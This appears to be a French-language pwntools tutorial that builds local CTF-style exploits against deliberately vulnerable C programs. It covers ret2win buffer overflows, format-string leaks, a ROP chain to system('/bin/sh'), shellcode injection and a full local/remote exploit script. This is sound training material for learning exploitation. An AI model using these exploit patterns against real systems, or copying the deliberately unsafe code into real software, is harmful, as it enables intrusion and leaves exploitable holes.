# 💻 Exemples Pratiques - Pwntools

Collection d'exemples réels et fonctionnels que vous pouvez utiliser directement.

---

## 1️⃣ Communication TCP de Base

### Exemple 1.1 : Serveur Simple

**Serveur** (à lancer dans un terminal) :
```bash
# Lancer un serveur d'écho
nc -lvnp 1234
```

**Client pwntools** :
```python
#!/usr/bin/env python3
from pwn import *

p = remote("localhost", 1234)

# Envoyer
p.sendline(b"Hello, World!")

# Recevoir
response = p.recvline()
print(response)

p.close()
```

**Exécution** :
```bash
python3 client.py
```

---

### Exemple 1.2 : Serveur qui Pose des Questions

**Serveur** (Python) :
```python
#!/usr/bin/env python3
import socket

server = socket.socket()
server.bind(("localhost", 1234))
server.listen(1)

conn, _ = server.accept()
conn.send(b"What is your name?\n")
name = conn.recv(100)
conn.send(b"Hello " + name)
conn.close()
```

**Client pwntools** :
```python
#!/usr/bin/env python3
from pwn import *

p = remote("localhost", 1234)

# Lire le prompt
prompt = p.recvline()
print(f"Server: {prompt}")

# Répondre
p.sendline(b"Alice")

# Recevoir la réponse
response = p.recvline()
print(f"Response: {response}")

p.close()
```

---

## 2️⃣ Packing/Unpacking

### Exemple 2.1 : Envoi d'Adresses

```python
#!/usr/bin/env python3
from pwn import *

# Adresse à envoyer
target_addr = 0x08048450

# Packer en 32-bit little-endian
packed = p32(target_addr)
print(f"Packed: {packed}")
print(f"Hex: {packed.hex()}")

# Unpacker
unpacked = u32(packed)
print(f"Unpacked: {hex(unpacked)}")

# Vérifier
assert unpacked == target_addr
print("✓ Correct!")
```

### Exemple 2.2 : Construire un Payload

```python
#!/usr/bin/env python3
from pwn import *

# Constantes
BUFFER_SIZE = 32
WIN_FUNC = 0x08048450

# Construire le payload
payload = b'A' * BUFFER_SIZE
payload += b'B' * 4  # Padding
payload += p32(WIN_FUNC)

print(f"Payload size: {len(payload)}")
print(f"Payload hex: {payload.hex()}")

# Envoyer à un serveur
p = remote("localhost", 1234)
p.send(payload)
p.close()
```

---

## 3️⃣ Analyser un ELF

### Exemple 3.1 : Extraction d'Informations

**Binaire de test** :
```bash
# Compiler un binaire simple
gcc -o test test.c
```

**test.c** :
```c
#include <stdio.h>

void win() {
    printf("You win!\n");
}

int main() {
    char buf[32];
    scanf("%s", buf);
    return 0;
}
```

**Analyse** :
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./test")

print("[+] Informations sur le binaire:")
print(f"    Architecture: {elf.arch}")
print(f"    Entry point: {hex(elf.entry)}")
print(f"    Base: {hex(elf.base)}")

print("\n[+] Symboles:")
for name, addr in sorted(elf.symbols.items()):
    if name.startswith('_'):
        continue
    print(f"    {name:20} @ {hex(addr)}")

print("\n[+] Protections:")
print(elf.checksec())

print("\n[+] Adresses importantes:")
print(f"    main: {hex(elf.symbols['main'])}")
print(f"    win: {hex(elf.symbols['win'])}")
print(f"    printf: {hex(elf.plt['printf'])}")
```

**Sortie** :
```
[+] Informations sur le binaire:
    Architecture: amd64
    Entry point: 0x400430
    Base: 0x400000

[+] Symboles:
    main                 @ 0x400546
    win                  @ 0x40051d

[+] Protections:
[*] '/home/user/test'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

[+] Adresses importantes:
    main: 0x400546
    win: 0x40051d
    printf: 0x400400
```

---

## 4️⃣ Buffer Overflow Simple

### Exemple 4.1 : BOF x86_64

**Binaire vulnérable** :
```c
#include <stdio.h>
#include <string.h>

void win() {
    system("/bin/sh");
}

int main() {
    char buf[32];
    gets(buf);  // Vulnérable!
    return 0;
}
```

**Compiler** :
```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```

**Exploit** :
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF("./vuln")

# Trouver l'offset
# Sur x86_64: 32 (buffer) + 8 (padding) = 40 bytes jusqu'au RIP
offset = 40

# Construire le payload
win_addr = elf.symbols['win']
payload = b'A' * offset
payload += p64(win_addr)

log.info(f"[*] win() @ {hex(win_addr)}")
log.info(f"[*] Payload size: {len(payload)}")

# Exploit
p = process("./vuln")
p.sendline(payload)
p.interactive()
```

---

## 5️⃣ Format String

### Exemple 5.1 : Lire la Mémoire

**Binaire vulnérable** :
```c
#include <stdio.h>

int main() {
    char input[100];
    scanf("%s", input);
    printf(input);  // Format String!
    return 0;
}
```

**Exploit** :
```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

p = process("./fmt_vuln")

# Lire les valeurs sur la stack
payload = b"AAAA %x %x %x %x %x"
p.sendline(payload)

output = p.recvline()
print(output)

# Lire une string
payload = b"AAAA %s"
p.sendline(payload)
output = p.recvline()
print(output)

p.close()
```

---

## 6️⃣ ROP Chains

### Exemple 6.1 : ROP Chain Simple

**Binaire avec gadgets** :
```bash
# Compiler sans PIE
gcc -o rop rop.c -fno-stack-protector -no-pie
```

**rop.c** :
```c
#include <stdio.h>
#include <string.h>

int main() {
    char buf[32];
    gets(buf);
    return 0;
}
```

**Exploit ROP** :
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

log.info("[*] Créating ROP chain...")

# Créer le ROP chain
rop = ROP(elf)

# Chercher /bin/sh dans libc
bin_sh = next(libc.search(b"/bin/sh"))
system_addr = libc.symbols['system']

# Créer l'appel: system("/bin/sh")
# Pour x86-64: rdi = arg1
rop.raw(rop.find_gadget(["pop rdi", "ret"])[0])
rop.raw(bin_sh)
rop.raw(system_addr)

chain = rop.chain()

# Payload
payload = b'A' * 40  # Buffer
payload += chain

log.info(f"[*] Payload size: {len(payload)}")

# Exploit
p = process("./rop")
p.sendline(payload)
p.interactive()
```

---

## 7️⃣ Shellcode

### Exemple 7.1 : Générer du Shellcode

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Générer /bin/sh
shellcode = asm(shellcraft.sh())

print(f"Shellcode size: {len(shellcode)} bytes")
print(f"Hex: {shellcode.hex()}")

# Ou désassembler pour voir
print("\nDisassembly:")
print(disasm(shellcode))
```

### Exemple 7.2 : Utiliser du Shellcode dans un Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF("./vuln")

# Générer shellcode
shellcode = asm(shellcraft.sh())

# Payload
# Supposons que le buffer se remplit de shellcode
# et que RIP pointe dans la stack
payload = shellcode
payload += b'\x90' * (40 - len(shellcode))  # Padding avec NOP
payload += p64(elf.bss(0x100))  # Adresse de la stack

p = process("./vuln")
p.sendline(payload)
p.interactive()
```

---

## 8️⃣ Debugging avec GDB

### Exemple 8.1 : Lancer avec GDB

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Lancer avec GDB
p = gdb.debug("./binary", gdbscript="""
    break main
    continue
    
    # À ce point, vous pouvez utiliser GDB
    # Puis l'exploit continue
""")

# Envoyer des données
p.sendline(b"test")

# Arrêt 2eme fois
gdb.attach(p, gdbscript="""
    break *0x00400550
    continue
""")

p.interactive()
```

---

## 9️⃣ Pattern/Cyclic

### Exemple 9.1 : Trouver un Offset

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Étape 1 : Générer un pattern
pattern = cyclic(200)

# Étape 2 : Envoyer au binaire (regarder où il crash)
p = process("./binary")
p.sendline(pattern)
# Binaire crash...
p.wait()

# Étape 3 : Analyser le crash avec GDB
# gdb> p $rip  → affiche l'adresse
# Supposons: RIP = 0x6161616161616161

# Étape 4 : Trouver dans le pattern
rip_value = 0x6161616161616161
rip_bytes = p64(rip_value)
offset = cyclic_find(rip_bytes)

log.success(f"Offset: {offset}")

# Étape 5 : Utiliser dans l'exploit
payload = cyclic(offset)
payload += p64(0x12345678)  # Nouvelle adresse
```

---

## 🔟 Exploit Complet (Exemple Réel)

### Exemple 10.1 : Challenge CTF Typique

**Binaire** :
```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void flag() {
    system("cat flag.txt");
}

int main() {
    char buf[64];
    puts("Enter data:");
    read(0, buf, 200);  // BOF
    printf("You entered: %s\n", buf);
    return 0;
}
```

**Exploit Complet** :
```python
#!/usr/bin/env python3

from pwn import *
import sys

# Configuration
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

BINARY = "./challenge"
HOST = "localhost"
PORT = 1234

def exploit_local():
    """Exploit local"""
    log.info("[*] Exploitation locale...")
    
    # Charger le binaire
    elf = ELF(BINARY)
    log.info(f"[+] Binary loaded: {BINARY}")
    
    # Afficher les protections
    print(elf.checksec())
    
    # Trouver l'adresse du flag
    flag_addr = elf.symbols['flag']
    log.success(f"[+] Flag function @ {hex(flag_addr)}")
    
    # Construire le payload
    # Buffer = 64 bytes, padding = 8 bytes, retour = 8 bytes
    offset = 64 + 8
    
    payload = b'A' * offset
    payload += p64(flag_addr)
    
    log.info(f"[*] Payload size: {len(payload)}")
    
    # Lancer le binaire
    p = process(BINARY)
    
    # Lire le prompt
    log.info("[*] Waiting for prompt...")
    p.recvline()
    
    # Envoyer le payload
    log.info("[*] Sending payload...")
    p.send(payload)
    
    # Recevoir la réponse
    log.info("[*] Waiting for flag...")
    response = p.recvall()
    
    print("\n" + "="*50)
    print(response.decode())
    print("="*50)
    
    p.close()

def exploit_remote():
    """Exploit remote"""
    log.info(f"[*] Connecting to {HOST}:{PORT}...")
    
    try:
        p = remote(HOST, PORT, timeout=10)
        log.success("[+] Connected!")
    except Exception as e:
        log.failure(f"[-] Connection failed: {e}")
        return
    
    # Même payload que local
    # Mais sans charger le binaire (serveur distant)
    # Utiliser les adresses que vous avez trouvées
    
    flag_addr = 0x401206  # À déterminer
    offset = 72
    
    payload = b'A' * offset
    payload += p64(flag_addr)
    
    log.info("[*] Sending payload...")
    p.recvline()
    p.send(payload)
    
    log.info("[*] Waiting for response...")
    response = p.recvall()
    
    print("\n" + "="*50)
    print(response.decode())
    print("="*50)
    
    p.close()

if __name__ == "__main__":
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "remote":
            exploit_remote()
        else:
            exploit_local()
    except KeyboardInterrupt:
        log.warning("[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        log.failure(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
```

**Utilisation** :
```bash
# Compiler le challenge
gcc -o challenge challenge.c -fno-stack-protector -no-pie

# Créer un flag pour tester
echo "flag{test_flag_123}" > flag.txt

# Exploit local
python3 exploit.py

# Ou remote (si vous avez un serveur)
python3 exploit.py remote
```

---

## 🎓 Exercices Proposés

### Exercice 1 : BOF x86
Modifiez l'exemple 4.1 pour **x86 32-bit** (gcc -m32)

### Exercice 2 : Format String Write
Modifiez l'exemple 5.1 pour **écrire** en mémoire avec %n

### Exercice 3 : Double ROP
Créez un ROP chain qui appelle **deux** fonctions

### Exercice 4 : Leak + Exploit
Créez un exploit qui leak une adresse puis l'utilise

---

## 🔗 Plus d'Exemples

Pour plus d'exemples :
- Voir `examples/` dans le dossier du repo
- Lire la documentation complète
- Résoudre des challenges CTF

---

## 💡 Tips Importants

1. **Toujours tester localement d'abord**
2. **Utiliser des patterns pour les offsets**
3. **Sauvegarder les payloads pour analyse**
4. **Utiliser GDB pour déboguer**
5. **Lire les messages d'erreur**
6. **Documenter votre code**

---

**Maintenant à vous de jouer! 🚀**

